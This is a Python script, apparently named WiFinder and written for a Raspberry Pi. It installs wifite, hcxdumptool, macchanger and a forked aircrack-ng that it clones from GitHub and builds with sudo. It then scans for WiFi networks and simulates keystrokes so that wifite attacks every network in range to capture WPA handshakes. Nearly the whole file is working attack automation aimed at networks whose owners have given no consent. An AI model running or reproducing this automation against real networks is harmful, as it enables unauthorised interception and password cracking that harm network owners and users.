#!/usr/bin/env python3
import signal
import os
import sys
import subprocess
import time
import glob
import shutil
from pynput.keyboard import Controller, Key
import pandas as pd
import importlib
from git import Repo
import time
import pyttsx3


SCAN_TIME = 60
AIRCRACK_REPO_PATH = "/home/pi/projeto/aircrack-ng"
WIFINDER_PATH = "/home/pi/projeto/WiFinder"
WIFITE_PATH = "/usr/sbin/wifite"

def sigint_handler(sig, frame):
    time.sleep(3)
    
def install_dependencies():
    try:
        subprocess.check_output(['which', 'ifconfig'])
    except:
        print('ifconfig is not installed. Installing...')
        subprocess.check_call(['sudo', 'apt-get', 'install', '-y', 'net-tools'])

    try:
        subprocess.check_output(['which', 'iw'])
    except:
        print('iwconfig is not installed. Installing...')
        subprocess.check_call(['sudo', 'apt-get', 'install', '-y', 'net-tools'])

    dependencies = ['hcxdumptool', 'macchanger', 'wifite']
    
    #we will check if it has the dependencies to run wifite, if not, it will install them
    for dependency in dependencies:
        try:
            subprocess.check_output(['which', dependency])
        except subprocess.CalledProcessError:
            print(f'{dependency} is not installed. Installing...')
            subprocess.check_call(['sudo', 'apt-get', 'install', '-y', dependency])
    

def main():

    signal.signal(signal.SIGINT, sigint_handler)   

    # Create an instance of the pyttsx3 library object
    engine = pyttsx3.init()

    # Make Python speak:
    engine.say("The WiFinder program is starting")

    # Wait for the speech to complete
    engine.runAndWait()

    print(" ___       ___    _____   _________    _____      __      _   ______      _____   ______    \n" + 
          "(  (       )  )  (_   _) (_   _____)  (_   _)    /  \    / ) (_  __ \    / ___/  (   __ \   \n" +
          " \  \  _  /  /     | |     ) (___       | |     / /\ \  / /    ) ) \ \  ( (__     ) (__) )  \n" + 
          "  \  \/ \/  /      | |    (   ___)      | |     ) ) ) ) ) )   ( (   ) )  ) __)   (    __/   \n" + 
          "   )   _   (       | |     ) (          | |    ( ( ( ( ( (     ) )  ) ) ( (       ) \ \  _  \n" + 
          "   \  ( )  /      _| |__  (   )        _| |__  / /  \ \/ /    / /__/ /   \ \___  ( ( \ \_)) \n" + 
          "    \_/ \_/      /_____(   \_/        /_____( (_/    \__/    (______/     \____\  )_) \__/  \n" ) 

    install_dependencies()

    if not os.path.isfile(os.path.join(WIFINDER_PATH, 'installed.txt')):
        
        # if the file doesn't exist, the program will remove the directory
        if os.path.exists(AIRCRACK_REPO_PATH):
            shutil.rmtree(AIRCRACK_REPO_PATH)

        # Install the libtool, libssl-dev and  libgcrypt-dev necessary to compile aircrack-ng
        os.system("sudo apt-get install -y libtool")
        os.system("sudo apt-get install -y libssl-dev")
        os.system("sudo apt-get install -y libgcrypt-dev")

        # Clone the repository using python-git library
        repo_url = "https://github.com/francsp1/aircrack-ng.git"
        Repo.clone_from(repo_url, AIRCRACK_REPO_PATH)
        
        # Change the working directory to "/home/pi/projeto/aircrack-ng"
        os.chdir(AIRCRACK_REPO_PATH)

        # Run the autoreconf command
        os.system("autoreconf -i")

        # Run the configure command
        os.system("sudo ./configure")
        
        # Run the make command
        os.system("make")

        # Run the make install command
        os.system("sudo make install")

        file_path = os.path.join(WIFINDER_PATH, "installed.txt")
        with open(file_path, "w") as f:
            f.write("Aircrack-ng for WiFinder is installed!")

        # Update the linker cache
        os.system("sudo ldconfig")
    else:
        print("Aircrack-ng for WiFinder is installed!")
        time.sleep(2)

    #exit(0)

    # Clear stdout 
    sys.stdout.flush()
 
    command = [WIFITE_PATH, "--all", "--kill", "--skip-crack", "--no-wps", "--no-pmkid", "--clients-only"]
    #command = ["python3", WIFITE_PATH, "--all", "--kill", "--skip-crack", "--no-wps", "--no-pmkid"]

    wifite_process = subprocess.Popen(command)
    
    # Wait for 3 minutes
    time.sleep(SCAN_TIME)
 
    # Copy the airodump-ng file created via wifite from tmp directory
    shutil.copy2(glob.glob('/tmp/wifite*/airodump-01.csv')[0], './')
    time.sleep(2)  
    
    # Make Python speak:
    engine.say("The scan of all networks is complete. We will start capturing the handshakes.")

    # Wait for the speech to complete
    engine.runAndWait()

    # Send the CTRL + C keystroke to stop scanning and "all" to attack all networks
    keyboard = Controller()
    keyboard.press(Key.ctrl)
    keyboard.press('c')
    keyboard.release('c')
    keyboard.release(Key.ctrl)
    time.sleep(3)
    keyboard.type('all\n')

    wifite_process.wait()
 

if __name__ == "__main__":
    main()
